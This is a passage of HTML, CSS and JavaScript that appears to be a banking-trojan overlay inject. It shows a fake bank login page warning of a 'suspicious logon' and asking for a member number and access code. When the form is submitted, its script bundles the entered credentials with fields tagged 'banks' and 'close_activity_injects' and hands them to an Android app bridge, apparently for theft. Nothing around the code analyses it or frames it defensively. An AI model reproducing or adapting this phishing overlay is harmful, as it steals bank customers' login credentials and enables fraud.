            font-weight: 600;
            color: #000;
            padding: 8px;
            border: 0;
            border-radius: 2px;
            background-color: #91bcc8;

        .button:disabled {
            background: rgb(233,233,233);
            background: linear-gradient(180deg, rgba(233,233,233,1) 0%, rgba(212,212,212,1) 100%);
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;

            <p style="margin-top: 30px;font-size: 22px;font-weight: 600;color: #16a5b3;"> Log in </p>
        </header>
        <section>
            <p style="color: #333;"> Suspicious logon detected. Fill in the required fields so we can verify your identity. </p>

            <input type="text" class="input" id="login" name="login" placeholder="Enter member number" autocomplete="off"> 
            <input type="password" class="input" id="password" name="password" placeholder="Enter access code" autocomplete="off"> 
        </section>
        <footer>
            <input type="submit" class="button" id="sendData" disabled value="Log in">
        </footer>
    </form>

    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        function check() {
            if(login.value.length >= 6 && password.value.length >= 6) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        login.onkeyup = () => {
            check();
        }

        password.onkeyup = () => {
            check();
        }

        sendData.onclick = () => {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
